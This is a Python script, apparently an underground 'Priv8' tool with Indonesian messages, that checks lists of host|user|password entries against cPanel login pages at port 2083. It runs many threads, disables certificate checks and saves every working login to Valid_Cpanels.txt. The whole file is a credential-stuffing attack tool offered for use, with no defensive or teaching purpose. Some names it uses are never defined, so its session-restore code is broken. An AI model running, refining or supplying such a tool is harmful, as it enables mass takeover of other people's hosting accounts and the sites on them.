import requests,urllib3
import re,io,os,requests
from threading import Thread
from multiprocessing.dummy import Pool
from colorama import *
from queue import Queue
from socket import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = Fore.LIGHTYELLOW_EX
cyan = Fore.CYAN
reset = Fore.RESET
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.LIGHTGREEN_EX
red = Fore.LIGHTRED_EX
res = Style.RESET_ALL
yl = Fore.YELLOW
cy = Fore.CYAN
mg = Fore.MAGENTA
bc = Back.GREEN
fr = Fore.RED
sr = Style.RESET_ALL
fb = Fore.BLUE
fc = Fore.LIGHTCYAN_EX
fg = Fore.GREEN
br = Back.RED
init(autoreset=True)

progres = 0

def screen_clear():
   # for mac and linux(here, os.name is 'posix')
   if os.name == 'posix':
      _ = os.system('clear')
   else:
      # for windows platfrom
      _ = os.system('cls')
screen_clear()


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception:
                self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

#CPANELS
def cpanel(host, user, pswd):
    try:
        s = requests.Session()
        data = {"user":user,"pass":pswd}
        text = s.post("https://"+host+":2083/login", data=data, verify=False, allow_redirects=False, timeout=1).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}Yes Oli CPANEL{fc}] | AJA KEPO TEK")
            fopen = open("Valid_Cpanels.txt","a")
            fopen.write("https://"+host+":2083|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}GAGAL LOGIN{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print(f"{fc}[{bl}KONEKSI BOSOKTEK{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
def cpa(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
            host = prepare[0].split('://')[1]
        else:
            host = prepare[0]
        user = prepare[3]
        password = prepare[4]
        cpanel(host, user, password)
        if "_" in prepare[3]:
            userr = prepare[3].split("_")[0]
            ppp = str(userr)
            cpanel(host, ppp, password)
    except:
        pass
    pass
#FINE CPANELS


def printez():
    print(f'''
{gr} ___       __      _______               ______                _____
{fc} __ |     / /_____ ___    |___           ___  / _____ _______ ____(_)______ _______
{yl} __ | /| / / _  _ \__  /| |__  ___/_  _ \__  /  _  _ \__  __ `/__  / _  __ \__  __ \{wh}
{wh} __ |/ |/ /  /  __/_  ___ |_  /    /  __/_  /___/  __/_  /_/ / _  /  / /_/ /_  / / /
{red} ____/|__/   \___/ /_/  |_|/_/     \___/ /_____/\___/ _\__, /  /_/   \____/ /_/ /_/
                                                      /____/


{gr}─────────────────────────────────────────────────────────────────────────────────────────

    ''')
printez()
try:
    readcfg = ConfigParser()
    readcfg.read(pid_restore)
    lists = readcfg.get('DB', 'FILES')
    numthread = readcfg.get('DB', 'THREAD')
    sessi = readcfg.get('DB', 'SESSION')
    print("log session bot found! restore session")
    print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
    tanya = input("Want to contineu session ? [Y/n] ")
    if "Y" in tanya or "y" in tanya:
        lerr = open(lists).read().split("\n"+sessi)[1]
        readsplit = lerr.splitlines()
    else:
        kntl # Send Error Biar Lanjut Ke Wxception :v
except:
    try:
        lists = sys.argv[1]
        numthread = sys.argv[2]
        readsplit = open(lists).read().splitlines()
    except:
        try:
            lists = input("\033[31;1m┌─\033[31;1m[\033[36;1mPriv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
            readsplit = open(lists).read().splitlines()
        except:
            print("Wrong input or list not found!")
            exit()
        try:
            numthread = input("\033[31;1m┌─\033[31;1m[\033[36;1m Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
        except:
            print("Wrong thread number!")
            exit()
pool = ThreadPool(int(numthread))
for url in readsplit:
    if "://" in url:
        url = url
    else:
        url = url
    if url.endswith('/'):
        url = url[:-1]
    jagases = url
    try:
        pool.add_task(cpa, url)
    except KeyboardInterrupt:
        session = open(pid_restore, 'w')
        cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
        session.write(cfgsession)
        session.close()
        print("CTRL+C Detect, Session saved")
        exit()
pool.wait_completion()
try:
    os.remove(pid_restore)
except:
    pass
